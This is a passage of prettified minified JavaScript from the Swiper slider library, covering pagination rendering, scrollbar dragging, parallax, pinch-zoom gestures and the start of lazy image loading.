                        .addClass(`${s.bulletActiveClass}-prev`)
                        .prev()
                        .addClass(`${s.bulletActiveClass}-prev-prev`),
                        n
                          .next()
                          .addClass(`${s.bulletActiveClass}-next`)
                          .next()
                          .addClass(`${s.bulletActiveClass}-next-next`);
                  }
                }
                if (s.dynamicBullets) {
                  const a = Math.min(i.length, s.dynamicMainBullets + 4),
                    n =
                      (e.pagination.bulletSize * a - e.pagination.bulletSize) /
                        2 -
                      l * e.pagination.bulletSize,
                    r = t ? "right" : "left";
                  i.css(e.isHorizontal() ? r : "top", `${n}px`);
                }
              }
              if (
                ("fraction" === s.type &&
                  (a
                    .find(`.${s.currentClass}`)
                    .text(s.formatFractionCurrent(n + 1)),
                  a.find(`.${s.totalClass}`).text(s.formatFractionTotal(r))),
                "progressbar" === s.type)
              ) {
                let t;
                t = s.progressbarOpposite
                  ? e.isHorizontal()
                    ? "vertical"
                    : "horizontal"
                  : e.isHorizontal()
                  ? "horizontal"
                  : "vertical";
                const i = (n + 1) / r;
                let o = 1,
                  l = 1;
                "horizontal" === t ? (o = i) : (l = i),
                  a
                    .find(`.${s.progressbarFillClass}`)
                    .transform(`translate3d(0,0,0) scaleX(${o}) scaleY(${l})`)
                    .transition(e.params.speed);
              }
              "custom" === s.type && s.renderCustom
                ? (a.html(s.renderCustom(e, n + 1, r)),
                  e.emit("paginationRender", e, a[0]))
                : e.emit("paginationUpdate", e, a[0]),
                a[
                  e.params.watchOverflow && e.isLocked
                    ? "addClass"
                    : "removeClass"
                ](s.lockClass);
            },
            render() {
              const e = this,
                t = e.params.pagination;
              if (
                !t.el ||
                !e.pagination.el ||
                !e.pagination.$el ||
                0 === e.pagination.$el.length
              )
                return;
              const s =
                  e.virtual && e.params.virtual.enabled
                    ? e.virtual.slides.length
                    : e.slides.length,
                i = e.pagination.$el;
              let a = "";
              if ("bullets" === t.type) {
                const n = e.params.loop
                  ? Math.ceil(
                      (s - 2 * e.loopedSlides) / e.params.slidesPerGroup
                    )
                  : e.snapGrid.length;
                for (let s = 0; s < n; s += 1)
                  t.renderBullet
                    ? (a += t.renderBullet.call(e, s, t.bulletClass))
                    : (a += `<${t.bulletElement} class="${t.bulletClass}"></${t.bulletElement}>`);
                i.html(a), (e.pagination.bullets = i.find(`.${t.bulletClass}`));
              }
              "fraction" === t.type &&
                ((a = t.renderFraction
                  ? t.renderFraction.call(e, t.currentClass, t.totalClass)
                  : `<span class="${t.currentClass}"></span> / <span class="${t.totalClass}"></span>`),
                i.html(a)),
                "progressbar" === t.type &&
                  ((a = t.renderProgressbar
                    ? t.renderProgressbar.call(e, t.progressbarFillClass)
                    : `<span class="${t.progressbarFillClass}"></span>`),
                  i.html(a)),
                "custom" !== t.type &&
                  e.emit("paginationRender", e.pagination.$el[0]);
            },
            init() {
              const e = this,
                t = e.params.pagination;
              if (!t.el) return;
              let s = d(t.el);
              0 !== s.length &&
                (e.params.uniqueNavElements &&
                  "string" == typeof t.el &&
                  s.length > 1 &&
                  (s = e.$el.find(t.el)),
                "bullets" === t.type &&
                  t.clickable &&
                  s.addClass(t.clickableClass),
                s.addClass(t.modifierClass + t.type),
                "bullets" === t.type &&
                  t.dynamicBullets &&
                  (s.addClass(`${t.modifierClass}${t.type}-dynamic`),
                  (e.pagination.dynamicBulletIndex = 0),
                  t.dynamicMainBullets < 1 && (t.dynamicMainBullets = 1)),
                "progressbar" === t.type &&
                  t.progressbarOpposite &&
                  s.addClass(t.progressbarOppositeClass),
                t.clickable &&
                  s.on("click", `.${t.bulletClass}`, function (t) {
                    t.preventDefault();
                    let s = d(this).index() * e.params.slidesPerGroup;
                    e.params.loop && (s += e.loopedSlides), e.slideTo(s);
                  }),
                h.extend(e.pagination, { $el: s, el: s[0] }));
            },
            destroy() {
              const e = this,
                t = e.params.pagination;
              if (
                !t.el ||
                !e.pagination.el ||
                !e.pagination.$el ||
                0 === e.pagination.$el.length
              )
                return;
              const s = e.pagination.$el;
              s.removeClass(t.hiddenClass),
                s.removeClass(t.modifierClass + t.type),
                e.pagination.bullets &&
                  e.pagination.bullets.removeClass(t.bulletActiveClass),
                t.clickable && s.off("click", `.${t.bulletClass}`);
            },
          },
          R = {
            setTranslate() {
              const e = this;
              if (!e.params.scrollbar.el || !e.scrollbar.el) return;
              const { scrollbar: t, rtlTranslate: s, progress: i } = e,
                { dragSize: a, trackSize: n, $dragEl: r, $el: o } = t,
                l = e.params.scrollbar;
              let d = a,
                c = (n - a) * i;
              s
                ? ((c = -c),
                  c > 0 ? ((d = a - c), (c = 0)) : -c + a > n && (d = n + c))
                : c < 0
                ? ((d = a + c), (c = 0))
                : c + a > n && (d = n - c),
                e.isHorizontal()
                  ? (r.transform(`translate3d(${c}px, 0, 0)`),
                    (r[0].style.width = `${d}px`))
                  : (r.transform(`translate3d(0px, ${c}px, 0)`),
                    (r[0].style.height = `${d}px`)),
                l.hide &&
                  (clearTimeout(e.scrollbar.timeout),
                  (o[0].style.opacity = 1),
                  (e.scrollbar.timeout = setTimeout(() => {
                    (o[0].style.opacity = 0), o.transition(400);
                  }, 1e3)));
            },
            setTransition(e) {
              const t = this;
              t.params.scrollbar.el &&
                t.scrollbar.el &&
                t.scrollbar.$dragEl.transition(e);
            },
            updateSize() {
              const e = this;
              if (!e.params.scrollbar.el || !e.scrollbar.el) return;
              const { scrollbar: t } = e,
                { $dragEl: s, $el: i } = t;
              (s[0].style.width = ""), (s[0].style.height = "");
              const a = e.isHorizontal() ? i[0].offsetWidth : i[0].offsetHeight,
                n = e.size / e.virtualSize,
                r = n * (a / e.size);
              let o;
              (o =
                "auto" === e.params.scrollbar.dragSize
                  ? a * n
                  : parseInt(e.params.scrollbar.dragSize, 10)),
                e.isHorizontal()
                  ? (s[0].style.width = `${o}px`)
                  : (s[0].style.height = `${o}px`),
                (i[0].style.display = n >= 1 ? "none" : ""),
                e.params.scrollbar.hide && (i[0].style.opacity = 0),
                h.extend(t, {
                  trackSize: a,
                  divider: n,
                  moveDivider: r,
                  dragSize: o,
                }),
                t.$el[
                  e.params.watchOverflow && e.isLocked
                    ? "addClass"
                    : "removeClass"
                ](e.params.scrollbar.lockClass);
            },
            getPointerPosition(e) {
              return this.isHorizontal()
                ? "touchstart" === e.type || "touchmove" === e.type
                  ? e.targetTouches[0].clientX
                  : e.clientX
                : "touchstart" === e.type || "touchmove" === e.type
                ? e.targetTouches[0].clientY
                : e.clientY;
            },
            setDragPosition(e) {
              const t = this,
                { scrollbar: s, rtlTranslate: i } = t,
                { $el: a, dragSize: n, trackSize: r, dragStartPos: o } = s;
              let l;
              (l =
                (s.getPointerPosition(e) -
                  a.offset()[t.isHorizontal() ? "left" : "top"] -
                  (null !== o ? o : n / 2)) /
                (r - n)),
                (l = Math.max(Math.min(l, 1), 0)),
                i && (l = 1 - l);
              const d =
                t.minTranslate() + (t.maxTranslate() - t.minTranslate()) * l;
              t.updateProgress(d),
                t.setTranslate(d),
                t.updateActiveIndex(),
                t.updateSlidesClasses();
            },
            onDragStart(e) {
              const t = this,
                s = t.params.scrollbar,
                { scrollbar: i, $wrapperEl: a } = t,
                { $el: n, $dragEl: r } = i;
              (t.scrollbar.isTouched = !0),
                (t.scrollbar.dragStartPos =
                  e.target === r[0] || e.target === r
                    ? i.getPointerPosition(e) -
                      e.target.getBoundingClientRect()[
                        t.isHorizontal() ? "left" : "top"
                      ]
                    : null),
                e.preventDefault(),
                e.stopPropagation(),
                a.transition(100),
                r.transition(100),
                i.setDragPosition(e),
                clearTimeout(t.scrollbar.dragTimeout),
                n.transition(0),
                s.hide && n.css("opacity", 1),
                t.params.cssMode &&
                  t.$wrapperEl.css("scroll-snap-type", "none"),
                t.emit("scrollbarDragStart", e);
            },
            onDragMove(e) {
              const t = this,
                { scrollbar: s, $wrapperEl: i } = t,
                { $el: a, $dragEl: n } = s;
              t.scrollbar.isTouched &&
                (e.preventDefault ? e.preventDefault() : (e.returnValue = !1),
                s.setDragPosition(e),
                i.transition(0),
                a.transition(0),
                n.transition(0),
                t.emit("scrollbarDragMove", e));
            },
            onDragEnd(e) {
              const t = this,
                s = t.params.scrollbar,
                { scrollbar: i, $wrapperEl: a } = t,
                { $el: n } = i;
              t.scrollbar.isTouched &&
                ((t.scrollbar.isTouched = !1),
                t.params.cssMode &&
                  (t.$wrapperEl.css("scroll-snap-type", ""), a.transition("")),
                s.hide &&
                  (clearTimeout(t.scrollbar.dragTimeout),
                  (t.scrollbar.dragTimeout = h.nextTick(() => {
                    n.css("opacity", 0), n.transition(400);
                  }, 1e3))),
                t.emit("scrollbarDragEnd", e),
                s.snapOnRelease && t.slideToClosest());
            },
            enableDraggable() {
              const e = this;
              if (!e.params.scrollbar.el) return;
              const {
                  scrollbar: t,
                  touchEventsTouch: s,
                  touchEventsDesktop: i,
                  params: a,
                } = e,
                r = t.$el[0],
                o = !(!u.passiveListener || !a.passiveListeners) && {
                  passive: !1,
                  capture: !1,
                },
                l = !(!u.passiveListener || !a.passiveListeners) && {
                  passive: !0,
                  capture: !1,
                };
              u.touch
                ? (r.addEventListener(s.start, e.scrollbar.onDragStart, o),
                  r.addEventListener(s.move, e.scrollbar.onDragMove, o),
                  r.addEventListener(s.end, e.scrollbar.onDragEnd, l))
                : (r.addEventListener(i.start, e.scrollbar.onDragStart, o),
                  n.addEventListener(i.move, e.scrollbar.onDragMove, o),
                  n.addEventListener(i.end, e.scrollbar.onDragEnd, l));
            },
            disableDraggable() {
              const e = this;
              if (!e.params.scrollbar.el) return;
              const {
                  scrollbar: t,
                  touchEventsTouch: s,
                  touchEventsDesktop: i,
                  params: a,
                } = e,
                r = t.$el[0],
                o = !(!u.passiveListener || !a.passiveListeners) && {
                  passive: !1,
                  capture: !1,
                },
                l = !(!u.passiveListener || !a.passiveListeners) && {
                  passive: !0,
                  capture: !1,
                };
              u.touch
                ? (r.removeEventListener(s.start, e.scrollbar.onDragStart, o),
                  r.removeEventListener(s.move, e.scrollbar.onDragMove, o),
                  r.removeEventListener(s.end, e.scrollbar.onDragEnd, l))
                : (r.removeEventListener(i.start, e.scrollbar.onDragStart, o),
                  n.removeEventListener(i.move, e.scrollbar.onDragMove, o),
                  n.removeEventListener(i.end, e.scrollbar.onDragEnd, l));
            },
            init() {
              const e = this;
              if (!e.params.scrollbar.el) return;
              const { scrollbar: t, $el: s } = e,
                i = e.params.scrollbar;
              let a = d(i.el);
              e.params.uniqueNavElements &&
                "string" == typeof i.el &&
                a.length > 1 &&
                1 === s.find(i.el).length &&
                (a = s.find(i.el));
              let n = a.find(`.${e.params.scrollbar.dragClass}`);
              0 === n.length &&
                ((n = d(`<div class="${e.params.scrollbar.dragClass}"></div>`)),
                a.append(n)),
                h.extend(t, { $el: a, el: a[0], $dragEl: n, dragEl: n[0] }),
                i.draggable && t.enableDraggable();
            },
            destroy() {
              this.scrollbar.disableDraggable();
            },
          },
          U = {
            setTransform(e, t) {
              const { rtl: s } = this,
                i = d(e),
                a = s ? -1 : 1,
                n = i.attr("data-swiper-parallax") || "0";
              let r = i.attr("data-swiper-parallax-x"),
                o = i.attr("data-swiper-parallax-y");
              const l = i.attr("data-swiper-parallax-scale"),
                c = i.attr("data-swiper-parallax-opacity");
              if (
                (r || o
                  ? ((r = r || "0"), (o = o || "0"))
                  : this.isHorizontal()
                  ? ((r = n), (o = "0"))
                  : ((o = n), (r = "0")),
                (r =
                  r.indexOf("%") >= 0
                    ? parseInt(r, 10) * t * a + "%"
                    : r * t * a + "px"),
                (o =
                  o.indexOf("%") >= 0
                    ? parseInt(o, 10) * t + "%"
                    : o * t + "px"),
                null != c)
              ) {
                const e = c - (c - 1) * (1 - Math.abs(t));
                i[0].style.opacity = e;
              }
              if (null == l) i.transform(`translate3d(${r}, ${o}, 0px)`);
              else {
                const e = l - (l - 1) * (1 - Math.abs(t));
                i.transform(`translate3d(${r}, ${o}, 0px) scale(${e})`);
              }
            },
            setTranslate() {
              const e = this,
                { $el: t, slides: s, progress: i, snapGrid: a } = e;
              t
                .children(
                  "[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]"
                )
                .each((t, s) => {
                  e.parallax.setTransform(s, i);
                }),
                s.each((t, s) => {
                  let n = s.progress;
                  e.params.slidesPerGroup > 1 &&
                    "auto" !== e.params.slidesPerView &&
                    (n += Math.ceil(t / 2) - i * (a.length - 1)),
                    (n = Math.min(Math.max(n, -1), 1)),
                    d(s)
                      .find(
                        "[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]"
                      )
                      .each((t, s) => {
                        e.parallax.setTransform(s, n);
                      });
                });
            },
            setTransition(e = this.params.speed) {
              const { $el: t } = this;
              t.find(
                "[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]"
              ).each((t, s) => {
                const i = d(s);
                let a =
                  parseInt(i.attr("data-swiper-parallax-duration"), 10) || e;
                0 === e && (a = 0), i.transition(a);
              });
            },
          },
          K = {
            getDistanceBetweenTouches(e) {
              if (e.targetTouches.length < 2) return 1;
              const t = e.targetTouches[0].pageX,
                s = e.targetTouches[0].pageY,
                i = e.targetTouches[1].pageX,
                a = e.targetTouches[1].pageY;
              return Math.sqrt((i - t) ** 2 + (a - s) ** 2);
            },
            onGestureStart(e) {
              const t = this,
                s = t.params.zoom,
                i = t.zoom,
                { gesture: a } = i;
              if (
                ((i.fakeGestureTouched = !1),
                (i.fakeGestureMoved = !1),
                !u.gestures)
              ) {
                if (
                  "touchstart" !== e.type ||
                  ("touchstart" === e.type && e.targetTouches.length < 2)
                )
                  return;
                (i.fakeGestureTouched = !0),
                  (a.scaleStart = K.getDistanceBetweenTouches(e));
              }
              (a.$slideEl && a.$slideEl.length) ||
              ((a.$slideEl = d(e.target).closest(`.${t.params.slideClass}`)),
              0 === a.$slideEl.length &&
                (a.$slideEl = t.slides.eq(t.activeIndex)),
              (a.$imageEl = a.$slideEl.find(
                "img, svg, canvas, picture, .swiper-zoom-target"
              )),
              (a.$imageWrapEl = a.$imageEl.parent(`.${s.containerClass}`)),
              (a.maxRatio =
                a.$imageWrapEl.attr("data-swiper-zoom") || s.maxRatio),
              0 !== a.$imageWrapEl.length)
                ? (a.$imageEl && a.$imageEl.transition(0),
                  (t.zoom.isScaling = !0))
                : (a.$imageEl = void 0);
            },
            onGestureChange(e) {
              const t = this.params.zoom,
                s = this.zoom,
                { gesture: i } = s;
              if (!u.gestures) {
                if (
                  "touchmove" !== e.type ||
                  ("touchmove" === e.type && e.targetTouches.length < 2)
                )
                  return;
                (s.fakeGestureMoved = !0),
                  (i.scaleMove = K.getDistanceBetweenTouches(e));
              }
              i.$imageEl &&
                0 !== i.$imageEl.length &&
                ((s.scale = u.gestures
                  ? e.scale * s.currentScale
                  : (i.scaleMove / i.scaleStart) * s.currentScale),
                s.scale > i.maxRatio &&
                  (s.scale =
                    i.maxRatio - 1 + (s.scale - i.maxRatio + 1) ** 0.5),
                s.scale < t.minRatio &&
                  (s.scale =
                    t.minRatio + 1 - (t.minRatio - s.scale + 1) ** 0.5),
                i.$imageEl.transform(`translate3d(0,0,0) scale(${s.scale})`));
            },
            onGestureEnd(e) {
              const t = this,
                s = t.params.zoom,
                i = t.zoom,
                { gesture: a } = i;
              if (!u.gestures) {
                if (!i.fakeGestureTouched || !i.fakeGestureMoved) return;
                if (
                  "touchend" !== e.type ||
                  ("touchend" === e.type &&
                    e.changedTouches.length < 2 &&
                    !x.android)
                )
                  return;
                (i.fakeGestureTouched = !1), (i.fakeGestureMoved = !1);
              }
              a.$imageEl &&
                0 !== a.$imageEl.length &&
                ((i.scale = Math.max(
                  Math.min(i.scale, a.maxRatio),
                  s.minRatio
                )),
                a.$imageEl
                  .transition(t.params.speed)
                  .transform(`translate3d(0,0,0) scale(${i.scale})`),
                (i.currentScale = i.scale),
                (i.isScaling = !1),
                1 === i.scale && (a.$slideEl = void 0));
            },
            onTouchStart(e) {
              const t = this.zoom,
                { gesture: s, image: i } = t;
              s.$imageEl &&
                0 !== s.$imageEl.length &&
                (i.isTouched ||
                  (x.android && e.cancelable && e.preventDefault(),
                  (i.isTouched = !0),
                  (i.touchesStart.x =
                    "touchstart" === e.type
                      ? e.targetTouches[0].pageX
                      : e.pageX),
                  (i.touchesStart.y =
                    "touchstart" === e.type
                      ? e.targetTouches[0].pageY
                      : e.pageY)));
            },
            onTouchMove(e) {
              const t = this,
                s = t.zoom,
                { gesture: i, image: a, velocity: n } = s;
              if (!i.$imageEl || 0 === i.$imageEl.length) return;
              if (((t.allowClick = !1), !a.isTouched || !i.$slideEl)) return;
              a.isMoved ||
                ((a.width = i.$imageEl[0].offsetWidth),
                (a.height = i.$imageEl[0].offsetHeight),
                (a.startX = h.getTranslate(i.$imageWrapEl[0], "x") || 0),
                (a.startY = h.getTranslate(i.$imageWrapEl[0], "y") || 0),
                (i.slideWidth = i.$slideEl[0].offsetWidth),
                (i.slideHeight = i.$slideEl[0].offsetHeight),
                i.$imageWrapEl.transition(0),
                t.rtl && ((a.startX = -a.startX), (a.startY = -a.startY)));
              const r = a.width * s.scale,
                o = a.height * s.scale;
              if (!(r < i.slideWidth && o < i.slideHeight)) {
                if (
                  ((a.minX = Math.min(i.slideWidth / 2 - r / 2, 0)),
                  (a.maxX = -a.minX),
                  (a.minY = Math.min(i.slideHeight / 2 - o / 2, 0)),
                  (a.maxY = -a.minY),
                  (a.touchesCurrent.x =
                    "touchmove" === e.type
                      ? e.targetTouches[0].pageX
                      : e.pageX),
                  (a.touchesCurrent.y =
                    "touchmove" === e.type
                      ? e.targetTouches[0].pageY
                      : e.pageY),
                  !a.isMoved && !s.isScaling)
                ) {
                  if (
                    t.isHorizontal() &&
                    ((Math.floor(a.minX) === Math.floor(a.startX) &&
                      a.touchesCurrent.x < a.touchesStart.x) ||
                      (Math.floor(a.maxX) === Math.floor(a.startX) &&
                        a.touchesCurrent.x > a.touchesStart.x))
                  )
                    return void (a.isTouched = !1);
                  if (
                    !t.isHorizontal() &&
                    ((Math.floor(a.minY) === Math.floor(a.startY) &&
                      a.touchesCurrent.y < a.touchesStart.y) ||
                      (Math.floor(a.maxY) === Math.floor(a.startY) &&
                        a.touchesCurrent.y > a.touchesStart.y))
                  )
                    return void (a.isTouched = !1);
                }
                e.cancelable && e.preventDefault(),
                  e.stopPropagation(),
                  (a.isMoved = !0),
                  (a.currentX =
                    a.touchesCurrent.x - a.touchesStart.x + a.startX),
                  (a.currentY =
                    a.touchesCurrent.y - a.touchesStart.y + a.startY),
                  a.currentX < a.minX &&
                    (a.currentX =
                      a.minX + 1 - (a.minX - a.currentX + 1) ** 0.8),
                  a.currentX > a.maxX &&
                    (a.currentX =
                      a.maxX - 1 + (a.currentX - a.maxX + 1) ** 0.8),
                  a.currentY < a.minY &&
                    (a.currentY =
                      a.minY + 1 - (a.minY - a.currentY + 1) ** 0.8),
                  a.currentY > a.maxY &&
                    (a.currentY =
                      a.maxY - 1 + (a.currentY - a.maxY + 1) ** 0.8),
                  n.prevPositionX || (n.prevPositionX = a.touchesCurrent.x),
                  n.prevPositionY || (n.prevPositionY = a.touchesCurrent.y),
                  n.prevTime || (n.prevTime = Date.now()),
                  (n.x =
                    (a.touchesCurrent.x - n.prevPositionX) /
                    (Date.now() - n.prevTime) /
                    2),
                  (n.y =
                    (a.touchesCurrent.y - n.prevPositionY) /
                    (Date.now() - n.prevTime) /
                    2),
                  Math.abs(a.touchesCurrent.x - n.prevPositionX) < 2 &&
                    (n.x = 0),
                  Math.abs(a.touchesCurrent.y - n.prevPositionY) < 2 &&
                    (n.y = 0),
                  (n.prevPositionX = a.touchesCurrent.x),
                  (n.prevPositionY = a.touchesCurrent.y),
                  (n.prevTime = Date.now()),
                  i.$imageWrapEl.transform(
                    `translate3d(${a.currentX}px, ${a.currentY}px,0)`
                  );
              }
            },
            onTouchEnd() {
              const e = this.zoom,
                { gesture: t, image: s, velocity: i } = e;
              if (!t.$imageEl || 0 === t.$imageEl.length) return;
              if (!s.isTouched || !s.isMoved)
                return (s.isTouched = !1), void (s.isMoved = !1);
              (s.isTouched = !1), (s.isMoved = !1);
              let a = 300,
                n = 300;
              const r = i.x * a,
                o = s.currentX + r,
                l = i.y * n,
                d = s.currentY + l;
              0 !== i.x && (a = Math.abs((o - s.currentX) / i.x)),
                0 !== i.y && (n = Math.abs((d - s.currentY) / i.y));
              const c = Math.max(a, n);
              (s.currentX = o), (s.currentY = d);
              const p = s.width * e.scale,
                h = s.height * e.scale;
              (s.minX = Math.min(t.slideWidth / 2 - p / 2, 0)),
                (s.maxX = -s.minX),
                (s.minY = Math.min(t.slideHeight / 2 - h / 2, 0)),
                (s.maxY = -s.minY),
                (s.currentX = Math.max(Math.min(s.currentX, s.maxX), s.minX)),
                (s.currentY = Math.max(Math.min(s.currentY, s.maxY), s.minY)),
                t.$imageWrapEl
                  .transition(c)
                  .transform(`translate3d(${s.currentX}px, ${s.currentY}px,0)`);
            },
            onTransitionEnd() {
              const e = this,
                t = e.zoom,
                { gesture: s } = t;
              s.$slideEl &&
                e.previousIndex !== e.activeIndex &&
                (s.$imageEl &&
                  s.$imageEl.transform("translate3d(0,0,0) scale(1)"),
                s.$imageWrapEl &&
                  s.$imageWrapEl.transform("translate3d(0,0,0)"),
                (t.scale = 1),
                (t.currentScale = 1),
                (s.$slideEl = void 0),
                (s.$imageEl = void 0),
                (s.$imageWrapEl = void 0));
            },
            toggle(e) {
              const t = this.zoom;
              t.scale && 1 !== t.scale ? t.out() : t.in(e);
            },
            in(e) {
              const t = this,
                s = t.zoom,
                i = t.params.zoom,
                { gesture: a, image: n } = s;
              if (
                (a.$slideEl ||
                  (t.params.virtual && t.params.virtual.enabled && t.virtual
                    ? (a.$slideEl = t.$wrapperEl.children(
                        `.${t.params.slideActiveClass}`
                      ))
                    : (a.$slideEl = t.slides.eq(t.activeIndex)),
                  (a.$imageEl = a.$slideEl.find(
                    "img, svg, canvas, picture, .swiper-zoom-target"
                  )),
                  (a.$imageWrapEl = a.$imageEl.parent(`.${i.containerClass}`))),
                !a.$imageEl || 0 === a.$imageEl.length)
              )
                return;
              let r, o, l, d, c, p, h, u, m, g, f, v, y, b, w, x, T, C;
              a.$slideEl.addClass(`${i.zoomedSlideClass}`),
                void 0 === n.touchesStart.x && e
                  ? ((r =
                      "touchend" === e.type
                        ? e.changedTouches[0].pageX
                        : e.pageX),
                    (o =
                      "touchend" === e.type
                        ? e.changedTouches[0].pageY
                        : e.pageY))
                  : ((r = n.touchesStart.x), (o = n.touchesStart.y)),
                (s.scale =
                  a.$imageWrapEl.attr("data-swiper-zoom") || i.maxRatio),
                (s.currentScale =
                  a.$imageWrapEl.attr("data-swiper-zoom") || i.maxRatio),
                e
                  ? ((T = a.$slideEl[0].offsetWidth),
                    (C = a.$slideEl[0].offsetHeight),
                    (l = a.$slideEl.offset().left),
                    (d = a.$slideEl.offset().top),
                    (c = l + T / 2 - r),
                    (p = d + C / 2 - o),
                    (m = a.$imageEl[0].offsetWidth),
                    (g = a.$imageEl[0].offsetHeight),
                    (f = m * s.scale),
                    (v = g * s.scale),
                    (y = Math.min(T / 2 - f / 2, 0)),
                    (b = Math.min(C / 2 - v / 2, 0)),
                    (w = -y),
                    (x = -b),
                    (h = c * s.scale),
                    (u = p * s.scale),
                    h < y && (h = y),
                    h > w && (h = w),
                    u < b && (u = b),
                    u > x && (u = x))
                  : ((h = 0), (u = 0)),
                a.$imageWrapEl
                  .transition(300)
                  .transform(`translate3d(${h}px, ${u}px,0)`),
                a.$imageEl
                  .transition(300)
                  .transform(`translate3d(0,0,0) scale(${s.scale})`);
            },
            out() {
              const e = this,
                t = e.zoom,
                s = e.params.zoom,
                { gesture: i } = t;
              i.$slideEl ||
                (e.params.virtual && e.params.virtual.enabled && e.virtual
                  ? (i.$slideEl = e.$wrapperEl.children(
                      `.${e.params.slideActiveClass}`
                    ))
                  : (i.$slideEl = e.slides.eq(e.activeIndex)),
                (i.$imageEl = i.$slideEl.find(
                  "img, svg, canvas, picture, .swiper-zoom-target"
                )),
                (i.$imageWrapEl = i.$imageEl.parent(`.${s.containerClass}`))),
                i.$imageEl &&
                  0 !== i.$imageEl.length &&
                  ((t.scale = 1),
                  (t.currentScale = 1),
                  i.$imageWrapEl
                    .transition(300)
                    .transform("translate3d(0,0,0)"),
                  i.$imageEl
                    .transition(300)
                    .transform("translate3d(0,0,0) scale(1)"),
                  i.$slideEl.removeClass(`${s.zoomedSlideClass}`),
                  (i.$slideEl = void 0));
            },
            enable() {
              const e = this,
                t = e.zoom;
              if (t.enabled) return;
              t.enabled = !0;
              const s = !(
                  "touchstart" !== e.touchEvents.start ||
                  !u.passiveListener ||
                  !e.params.passiveListeners
                ) && { passive: !0, capture: !1 },
                i = !u.passiveListener || { passive: !1, capture: !0 },
                a = `.${e.params.slideClass}`;
              u.gestures
                ? (e.$wrapperEl.on("gesturestart", a, t.onGestureStart, s),
                  e.$wrapperEl.on("gesturechange", a, t.onGestureChange, s),
                  e.$wrapperEl.on("gestureend", a, t.onGestureEnd, s))
                : "touchstart" === e.touchEvents.start &&
                  (e.$wrapperEl.on(e.touchEvents.start, a, t.onGestureStart, s),
                  e.$wrapperEl.on(e.touchEvents.move, a, t.onGestureChange, i),
                  e.$wrapperEl.on(e.touchEvents.end, a, t.onGestureEnd, s),
                  e.touchEvents.cancel &&
                    e.$wrapperEl.on(
                      e.touchEvents.cancel,
                      a,
                      t.onGestureEnd,
                      s
                    )),
                e.$wrapperEl.on(
                  e.touchEvents.move,
                  `.${e.params.zoom.containerClass}`,
                  t.onTouchMove,
                  i
                );
            },
            disable() {
              const e = this,
                t = e.zoom;
              if (!t.enabled) return;
              e.zoom.enabled = !1;
              const s = !(
                  "touchstart" !== e.touchEvents.start ||
                  !u.passiveListener ||
                  !e.params.passiveListeners
                ) && { passive: !0, capture: !1 },
                i = !u.passiveListener || { passive: !1, capture: !0 },
                a = `.${e.params.slideClass}`;
              u.gestures
                ? (e.$wrapperEl.off("gesturestart", a, t.onGestureStart, s),
                  e.$wrapperEl.off("gesturechange", a, t.onGestureChange, s),
                  e.$wrapperEl.off("gestureend", a, t.onGestureEnd, s))
                : "touchstart" === e.touchEvents.start &&
                  (e.$wrapperEl.off(
                    e.touchEvents.start,
                    a,
                    t.onGestureStart,
                    s
                  ),
                  e.$wrapperEl.off(e.touchEvents.move, a, t.onGestureChange, i),
                  e.$wrapperEl.off(e.touchEvents.end, a, t.onGestureEnd, s),
                  e.touchEvents.cancel &&
                    e.$wrapperEl.off(
                      e.touchEvents.cancel,
                      a,
                      t.onGestureEnd,
                      s
                    )),
                e.$wrapperEl.off(
                  e.touchEvents.move,
                  `.${e.params.zoom.containerClass}`,
                  t.onTouchMove,
                  i
                );
            },
          },
          Z = {
            loadInSlide(e, t = !0) {
              const s = this,
                i = s.params.lazy;
              if (void 0 === e) return;
              if (0 === s.slides.length) return;
              const a =
                s.virtual && s.params.virtual.enabled
                  ? s.$wrapperEl.children(
                      `.${s.params.slideClass}[data-swiper-slide-index="${e}"]`
                    )
                  : s.slides.eq(e);
              let n = a.find(
                `.${i.elementClass}:not(.${i.loadedClass}):not(.${i.loadingClass})`
              );
              !a.hasClass(i.elementClass) ||
                a.hasClass(i.loadedClass) ||
                a.hasClass(i.loadingClass) ||
                (n = n.add(a[0])),
                0 !== n.length &&
                  n.each((e, n) => {
                    const r = d(n);
                    r.addClass(i.loadingClass);
                    const o = r.attr("data-background"),
                      l = r.attr("data-src"),
                      c = r.attr("data-srcset"),
                      p = r.attr("data-sizes"),
                      h = r.parent("picture");
                    s.loadImage(r[0], l || o, c, p, !1, () => {
                      if (null != s && s && (!s || s.params) && !s.destroyed) {
                        if (
                          (o
                            ? (r.css("background-image", `url("${o}")`),
                              r.removeAttr("data-background"))
                            : (c &&
                                (r.attr("srcset", c),
                                r.removeAttr("data-srcset")),
                              p &&
                                (r.attr("sizes", p),
                                r.removeAttr("data-sizes")),
                              h.length &&
                                h.children("source").each((e, t) => {
                                  const s = d(t);
                                  s.attr("data-srcset") &&
                                    (s.attr("srcset", s.attr("data-srcset")),
                                    s.removeAttr("data-srcset"));
                                }),
                              l &&
                                (r.attr("src", l), r.removeAttr("data-src"))),
                          r.addClass(i.loadedClass).removeClass(i.loadingClass),
                          a.find(`.${i.preloaderClass}`).remove(),
                          s.params.loop && t)
                        ) {
                          const e = a.attr("data-swiper-slide-index");
                          if (a.hasClass(s.params.slideDuplicateClass)) {
                            const t = s.$wrapperEl.children(
                              `[data-swiper-slide-index="${e}"]:not(.${s.params.slideDuplicateClass})`
                            );
                            s.lazy.loadInSlide(t.index(), !1);
                          } else {
                            const t = s.$wrapperEl.children(
                              `.${s.params.slideDuplicateClass}[data-swiper-slide-index="${e}"]`
                            );
                            s.lazy.loadInSlide(t.index(), !1);
                          }
                        }
                        s.emit("lazyImageReady", a[0], r[0]),
                          s.params.autoHeight && s.updateAutoHeight();
                      }
                    }),
                      s.emit("lazyImageLoad", a[0], r[0]);
                  });
            },
            load() {
              const e = this,
                { $wrapperEl: t, params: s, slides: i, activeIndex: a } = e,
                n = e.virtual && s.virtual.enabled,
                r = s.lazy;
              let o = s.slidesPerView;
              function l(e) {
                if (n) {
                  if (
                    t.children(
                      `.${s.slideClass}[data-swiper-slide-index="${e}"]`
                    ).length
                  )
                    return !0;
                } else if (i[e]) return !0;
                return !1;
              }
              function c(e) {
                return n ? d(e).attr("data-swiper-slide-index") : d(e).index();
              }
              if (
                ("auto" === o && (o = 0),
                e.lazy.initialImageLoaded || (e.lazy.initialImageLoaded = !0),
                e.params.watchSlidesVisibility)
